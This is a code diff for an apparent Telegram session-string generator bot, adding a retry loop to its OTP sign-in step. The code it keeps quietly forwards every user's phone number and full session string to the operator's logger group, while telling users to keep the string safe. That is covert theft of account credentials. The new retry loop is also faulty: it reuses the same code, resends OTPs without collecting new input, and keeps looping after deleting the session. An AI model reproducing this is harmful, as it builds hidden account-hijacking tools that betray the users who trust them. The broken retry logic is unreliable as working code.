@@ -82,27 +82,36 @@ async def process_input(event):
         phone_number = user_sessions[user_id]["phone"]
         phone_code_hash = user_sessions[user_id]["phone_code_hash"]
 
-        try:
-            if isinstance(client, PyroClient):
-                await client.sign_in(phone_number, phone_code_hash, otp_code)
-                session_string = await client.export_session_string()  # 🔥 FIXED: Await किया गया!
-            else:
-                await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)
-                session_string = client.session.save()  # 🔥 FIXED: Telethon के लिए सही method!
+        retries = 3  # Max retries for OTP
+        for attempt in range(retries):
+            try:
+                if isinstance(client, PyroClient):
+                    await client.sign_in(phone_number, phone_code_hash, otp_code)
+                    session_string = await client.export_session_string()  # 🔥 FIXED: Await किया गया!
+                else:
+                    await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)
+                    session_string = client.session.save()  # 🔥 FIXED: Telethon के लिए सही method!
 
-            await bot.send_message(LOGGER_GROUP_ID, f"**🆕 New Session Generated!**\n\n**👤 User:** `{user_id}`\n**📞 Phone:** `{phone_number}`\n**🔑 Session:** `{session_string}`")
+                await bot.send_message(LOGGER_GROUP_ID, f"**🆕 New Session Generated!**\n\n**👤 User:** `{user_id}`\n**📞 Phone:** `{phone_number}`\n**🔑 Session:** `{session_string}`")
 
-            await event.respond(f"✅ **Your Session String:**\n\n```{session_string}```\n\n🔒 **Keep this safe!**")
-            del user_sessions[user_id]
+                await event.respond(f"✅ **Your Session String:**\n\n```{session_string}```\n\n🔒 **Keep this safe!**")
+                del user_sessions[user_id]
+                break  # Exit after successful OTP verification
 
-        except PhoneCodeExpiredError:
-            await event.respond("❌ **Error:** The confirmation code has expired. Please request a new code.")
-            user_sessions[user_id]["step"] = "phone"  # Go back to phone step
-            await event.respond("📱 **Enter your phone number with country code again (e.g., +919876543210)**")
+            except PhoneCodeExpiredError:
+                if attempt < retries - 1:
+                    await event.respond(f"❌ **Error:** The confirmation code has expired. Trying again... ({attempt + 1}/{retries})")
+                    # Resend code logic (add retry mechanism)
+                    sent_code = await client.send_code(phone_number)
+                    user_sessions[user_id]["phone_code_hash"] = sent_code.phone_code_hash  # Update phone_code_hash
+                    await event.respond("🔹 **New OTP sent. Please enter the code again.**")
+                else:
+                    await event.respond("❌ **Error:** The OTP expired multiple times. Please try again later.")
+                    del user_sessions[user_id]  # Remove session if failed after retries
 
-        except Exception as e:
-            await event.respond(f"❌ **Error:** {str(e)}\n🔄 Please try again!")
-            del user_sessions[user_id]
+            except Exception as e:
+                await event.respond(f"❌ **Error:** {str(e)}\n🔄 Please try again!")
+                del user_sessions[user_id]
 
     # ✅ Step 3: Enter 2FA Password
     elif step == "password":
